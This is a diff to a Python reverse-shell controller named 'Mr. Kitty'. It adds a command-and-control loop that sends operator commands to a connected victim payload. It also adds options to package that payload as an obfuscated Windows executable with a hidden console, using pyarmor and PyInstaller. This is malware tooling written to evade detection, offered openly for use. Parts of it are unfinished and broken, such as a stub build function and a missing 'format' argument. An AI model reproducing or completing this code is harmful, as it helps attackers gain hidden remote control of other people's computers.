@@ -6,20 +6,37 @@ import subprocess # spawn processes, connect to I/O pipes, obtain return codes
 import sys # system stuff
 import textwrap # wrapping text
 import threading
+import json
+import os
+import time
 
 # CONSTS:
 IP = '0.0.0.0'
 PORT = 9998
 
+def recvFromTarget(socket):
+        pass
+
+def sendFromSource(socket, buffer):
+    jsonData = json.dumps(buffer)
+    socket.send(jsonData.encode())
+
 # MrKitty class
 class MrKitty:
-    def __init__(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def __init__(self, fileName, format, obfuscator, allowConsole):
 
+        self.fileName = fileName
+        self.format = format
+        self.obfuscator = obfuscator
+        self.allowConsole = allowConsole
+
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
     def createExecutable(self):
-        pass
+        # STILL IN WORK
+        obfuscatorString = f"pyarmor obfuscate --exact kittyPayload.py"
+        pyinstallerString = f"cd dist && python -m PyInstaller kittyPayload.py"
 
     def runAndListen(self):
         self.sock.bind((IP, PORT)) # listen to the requests on 127.0.0.1:9998
@@ -37,32 +54,42 @@ class MrKitty:
 
     def handleClient(self, clientSocket):
             # we are executing a command 
-            outputBuffer = b''
+            result = ''
             while True:
+                print("#>> Waiting for response..", end='\n')
+                def recvFromTarget():
+                    while True:
+                        data = ''
+                        try:
+                            data += clientSocket.recv(1024).decode("utf-8").rstrip()
+                            try:
+                                return json.loads(data)
+                            except Exception as e:
+                                print(f"Exception:{e}")
+                                break
+                        except ValueError as e:
+                            continue
+                result = recvFromTarget()
+                print(result)
                 try:
-                    # TODO: TO MODIFY THE WAY YOU WORK WITH THE BUFFER!
-                    print("#>> Waiting for response..", end='\n')
-                    while '\n' not in outputBuffer.decode():
-                        # print("[*] I m reading!!..")
-                        outputBuffer += clientSocket.recv(64)
+                    buffer = input("#>> ")
 
-                    stringBuffer = outputBuffer.decode()
-                    print("#>> Output: " + stringBuffer)
-
-                    buffer = input("Command #>> ")
-                    try:
-                        clientSocket.send(buffer.encode())
-                    except Exception as eroare:
-                        print(f"am o eroare: {eroare}")
-                    
-                    outputBuffer = b''
-
-                except Exception as ex:
-                    print(f'Server killed: {ex}')
-                    self.sock.close()
-                    sys.exit()
-
-
+                    if buffer == 'quit':
+                        print("#>> Connection closed.")
+                        break
+                    elif buffer == 'clear':
+                        os.system('clear') # clear the console
+                        sendFromSource(clientSocket, buffer) # doesn t work on windows tho
+                    else:
+                        sendFromSource(clientSocket, buffer)
+                except Exception as e:
+                    print(f'Server killed: {e}')
+                    break
+            
+            self.sock.close()
+            sys.exit()
+        
+        
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -77,7 +104,7 @@ if __name__ == "__main__":
             _...----...      ...   ...      ...----..._
          .-'__..-""'----    `.  `"`  .'    ----'""-..__`-.
         '.-'   _.--"""'       `-._.-'       '"""--._   `-.`
-        '  .-"'                  :                  `"-.  ` - Mr. Kitty (alpha v1.0.0)
+        '  .-"'                  :                  `"-.  ` - Mr. Kitty (alpha v1.0.1)
           '   `.              _.'"'._              .'   `
                 `.       ,.-'"       "'-.,       .'
                   `.                           .'
@@ -94,22 +121,47 @@ if __name__ == "__main__":
         epilog=textwrap.dedent(
             '''
             Example:
-            You can run the command by mainKitty.py to start the server and kittyPayload.py on the client
-            (work still in progress!!)
+            ------------------------------------------------------------------
+            FOR WINDOWS:
+            python mainKitty.py --customName kitty --allowconsole False  # creates the "kitty.exe" payload without a visible console.
+            python mainKitty.py --format .exe --allowconsole False --obfuscate True #obfuscates the payload and then creates the kitty.exe without a visible console.
+
+            ------------------------------------------------------------------
+            Since you cannot create .exe files in Linux, I will try to add more functionality to Linux soon. 
             '''
         )  
     )
-    # parser.add_argument('-name', '--customName', help='Create a custom name')
-
+    parser.add_argument('-name', '--customName', help='Create a custom name for the executable')
+    parser.add_argument('-allowconsole', '--allowconsole', help='Set the payload\'s console visibility')
+    parser.add_argument('-obfuscate', '--obfuscate', help='Obfuscate the payload')
+    parser.add_argument('-run', '--run', action='store_true', help='Run the reverse shell and wait for the incoming connections')
+    parser.add_argument('-createExe', '--createExe', help="Create executable.")
     args = vars(parser.parse_args())
-    fileName = None
 
-    # if args['customName']:
-    #     fileName = str(args['customName']) + ".exe"
-    # else:
-    #     fileName = "mrKitty.exe"
+    fileName = None
+    format = "exe"
+    obfuscator = False
+    allowConsole = False
     
+    if args['createExe']:
+        # VERIFYING ARGUMENTS
+        if args['customName']:
+            fileName = str(args['customName']) + ".exe"
+        else:
+            fileName = "mrKitty"
+
+        if args['format']:
+            if str(args['format']) == "py":
+                format = "py"
+
+        if args['obfuscate']:
+            if bool(args['obfuscate']) == True:
+                obfuscator = True
     # print(fileName)
 
-    kitty = MrKitty()
-    kitty.runAndListen()
+    kitty = MrKitty(fileName, format, obfuscator, allowConsole)
+    if args['run']:
+        kitty.runAndListen()
+    
+
+    
